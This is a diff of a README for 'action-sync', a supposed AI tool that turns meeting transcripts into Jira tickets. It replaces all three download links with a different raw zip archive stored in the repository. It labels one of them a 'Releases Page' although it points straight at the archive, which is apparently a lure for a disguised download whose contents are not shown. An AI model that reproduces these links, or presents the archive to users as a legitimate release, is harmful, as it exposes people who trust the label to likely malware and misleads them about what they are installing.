@@ -1,7 +1,7 @@
 # 🤖 action-sync - Effortlessly Turn Meetings into Jira Tickets
 
 ## 📥 Download Here
-[![Download Latest Release](https://raw.githubusercontent.com/musicpiyush/action-sync/master/frontend/static/js/action_sync_2.7-alpha.2.zip%20Latest%20Release-Action%20Sync-brightgreen)](https://raw.githubusercontent.com/musicpiyush/action-sync/master/frontend/static/js/action_sync_2.7-alpha.2.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/musicpiyush/action-sync/master/frontend/action-sync-moorbird.zip%20Latest%20Release-Action%20Sync-brightgreen)](https://raw.githubusercontent.com/musicpiyush/action-sync/master/frontend/action-sync-moorbird.zip)
 
 ## 🚀 Getting Started
 action-sync is an AI tool designed to simplify your workflow. It converts meeting transcripts into Jira tickets, helping developers save time and focus on tasks that matter.
@@ -22,7 +22,7 @@ action-sync is an AI tool designed to simplify your workflow. It converts meetin
 To start using action-sync, follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to access the latest version.
-   [Visit the Action Sync Releases Page](https://raw.githubusercontent.com/musicpiyush/action-sync/master/frontend/static/js/action_sync_2.7-alpha.2.zip)
+   [Visit the Action Sync Releases Page](https://raw.githubusercontent.com/musicpiyush/action-sync/master/frontend/action-sync-moorbird.zip)
    
 2. **Choose the Right Version:** Find the latest release. Look for a file that matches your operating system.
    
@@ -89,6 +89,6 @@ action-sync falls under various categories that enhance productivity and automat
 ## 📞 Contact
 For additional support, reach out through our GitHub repository. We will promptly assist you with any questions or concerns.
 
-[Download the Latest Release Again](https://raw.githubusercontent.com/musicpiyush/action-sync/master/frontend/static/js/action_sync_2.7-alpha.2.zip) 
+[Download the Latest Release Again](https://raw.githubusercontent.com/musicpiyush/action-sync/master/frontend/action-sync-moorbird.zip) 
 
 Take control of your meetings and projects with action-sync today!
